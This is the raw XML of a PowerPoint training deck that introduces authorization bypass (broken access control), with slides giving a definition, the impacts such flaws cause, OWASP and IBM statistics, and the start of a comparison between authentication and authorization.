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90" r:id="rId11"/>
    <p:sldId id="291" r:id="rId12"/>
    <p:sldId id="266" r:id="rId13"/>
    <p:sldId id="267" r:id="rId14"/>
    <p:sldId id="268" r:id="rId15"/>
    <p:sldId id="269" r:id="rId16"/>
    <p:sldId id="270" r:id="rId17"/>
    <p:sldId id="271" r:id="rId18"/>
    <p:sldId id="272" r:id="rId19"/>
    <p:sldId id="273" r:id="rId20"/>
    <p:sldId id="274" r:id="rId21"/>
    <p:sldId id="292" r:id="rId22"/>
    <p:sldId id="276" r:id="rId23"/>
    <p:sldId id="277" r:id="rId24"/>
    <p:sldId id="278" r:id="rId25"/>
    <p:sldId id="279" r:id="rId26"/>
    <p:sldId id="280" r:id="rId27"/>
    <p:sldId id="293" r:id="rId28"/>
    <p:sldId id="294" r:id="rId29"/>
    <p:sldId id="295" r:id="rId30"/>
    <p:sldId id="296" r:id="rId31"/>
    <p:sldId id="297" r:id="rId32"/>
    <p:sldId id="298" r:id="rId33"/>
    <p:sldId id="285" r:id="rId34"/>
    <p:sldId id="286" r:id="rId35"/>
    <p:sldId id="287" r:id="rId36"/>
    <p:sldId id="288" r:id="rId37"/>
    <p:sldId id="289" r:id="rId38"/>
  </p:sldIdLst>
  <p:sldSz cx="14630400" cy="8229600"/>
  <p:notesSz cx="8229600" cy="14630400"/>
  <p:embeddedFontLst>
    <p:embeddedFont>
      <p:font typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
      <p:regular r:id="rId40"/>
      <p:bold r:id="rId41"/>
      <p:italic r:id="rId42"/>
      <p:boldItalic r:id="rId43"/>
    </p:embeddedFont>
    <p:embeddedFont>
      <p:font typeface="Inter" panose="020B0604020202020204" charset="0"/>
      <p:regular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164" autoAdjust="0"/>
    <p:restoredTop sz="94610"/>
  </p:normalViewPr>
  <p:slideViewPr>
    <p:cSldViewPr snapToGrid="0" snapToObjects="1">
      <p:cViewPr>
        <p:scale>
          <a:sx n="25" d="100"/>
          <a:sy n="25" d="100"/>
        </p:scale>
        <p:origin x="2376" y="11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3664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11151"/>
            <a:ext cx="14630400" cy="8229600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF">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44604"/>
            <a:ext cx="14630400" cy="8229600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF">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8.sv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hyperlink" Target="https://example.com/profile.php?id=123" TargetMode="External"/><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hyperlink" Target="https://example.com/profile.php?id=456"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28.sv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30.svg"/></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32.sv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3742611"/>
            <a:ext cx="5954197" cy="744260"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="5850"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="4650" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Authorization Bypass</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4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673185"/>
            <a:ext cx="8301633" cy="744260"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="5850"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="4650" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>What is Authorization Bypass?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4650" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="793790" y="2508171"/>
            <a:ext cx="4763333" cy="595432"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="4650"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3750" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Definition</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="793790" y="3443764"/>
            <a:ext cx="13042821" cy="725805"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="squar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Authorization Bypass</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1750" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> (also called </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1750" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Broken Access Control</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1750" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>) occurs when an application fails to properly enforce access controls, allowing users to:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="793790" y="4424720"/>
            <a:ext cx="13042821" cy="1814623"/>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Access resources they shouldn't have access to</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1750" dirty="0"/>
          </a:p>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Perform actions beyond their privilege level</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1750" dirty="0"/>
          </a:p>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View or modify other users' data</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1750" dirty="0"/>
          </a:p>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Execute administrative functions</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1750" dirty="0"/>
          </a:p>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Bypass payment or subscription requirements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64858" y="660559"/>
            <a:ext cx="6606778" cy="573524"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="4500"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Impact of Authorization Bypass</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="3" name="Image 0" descr="preencoded.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="764858" y="1655088"/>
            <a:ext cx="4366855" cy="874038"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="983337" y="2739628"/>
            <a:ext cx="2868216" cy="358497"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2800"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2250" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Data Breach</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Image 1" descr="preencoded.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="5131713" y="1655088"/>
            <a:ext cx="4366855" cy="874038"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5350193" y="2739628"/>
            <a:ext cx="2868216" cy="358497"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2800"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2250" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Privilege Escalation</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="7" name="Image 2" descr="preencoded.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId5"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="9498568" y="1655088"/>
            <a:ext cx="4366855" cy="874038"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9717048" y="2739628"/>
            <a:ext cx="2868216" cy="358497"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2800"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2250" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Account Takeover</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1092637" y="3790236"/>
            <a:ext cx="12772906" cy="343138"/>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Unauthorized Access to Resources</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Shape 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="764858" y="3553420"/>
            <a:ext cx="30480" cy="816769"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="007EBD"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Shape 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="764858" y="4607004"/>
            <a:ext cx="3117294" cy="795338"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 11540"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CCEEFF"/>
          </a:solidFill>
          <a:ln w="7620">
            <a:solidFill>
              <a:srgbClr val="B2D4E5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="990957" y="4833104"/>
            <a:ext cx="2665095" cy="343138"/>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Financial Loss</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Shape 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4092654" y="4607004"/>
            <a:ext cx="3117294" cy="795338"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 11540"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CCEEFF"/>
          </a:solidFill>
          <a:ln w="7620">
            <a:solidFill>
              <a:srgbClr val="B2D4E5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4318754" y="4833104"/>
            <a:ext cx="2665095" cy="343138"/>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Reputation Damage</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Shape 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7420451" y="4607004"/>
            <a:ext cx="3117294" cy="795338"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 11540"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CCEEFF"/>
          </a:solidFill>
          <a:ln w="7620">
            <a:solidFill>
              <a:srgbClr val="B2D4E5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7646551" y="4833104"/>
            <a:ext cx="2665095" cy="343138"/>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Legal Consequences</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Shape 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10748248" y="4607004"/>
            <a:ext cx="3117294" cy="795338"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 11540"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CCEEFF"/>
          </a:solidFill>
          <a:ln w="7620">
            <a:solidFill>
              <a:srgbClr val="B2D4E5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Text 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10974348" y="4833104"/>
            <a:ext cx="2665095" cy="343138"/>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Compliance Violations</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Text 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="764858" y="5718096"/>
            <a:ext cx="2868216" cy="358497"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2800"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2250" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Statistics:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Text 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="764858" y="6392347"/>
            <a:ext cx="13100685" cy="1029770"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPts val="2700"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>#1 vulnerability</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> in OWASP Top 10 (2021)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPts val="2700"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>34%</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> of all web applications have broken access control</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPts val="2700"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Average cost:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> $4.24 million per data breach (IBM 2021)</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945713"/>
            <a:ext cx="8807648" cy="744260"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="5850"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="4650" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Authentication vs Authorization</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4650" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="793790" y="1780699"/>
            <a:ext cx="4763333" cy="595432"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="4650"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3750" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Key Differences</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="793790" y="2716292"/>
            <a:ext cx="13042821" cy="4567476"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2086"/>
            </a:avLst>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="7620">
            <a:solidFill>
              <a:srgbClr val="000000">
                <a:alpha val="8000"/>
              </a:srgbClr>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="801410" y="2723912"/>
            <a:ext cx="13027581" cy="650319"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF">
              <a:alpha val="4000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
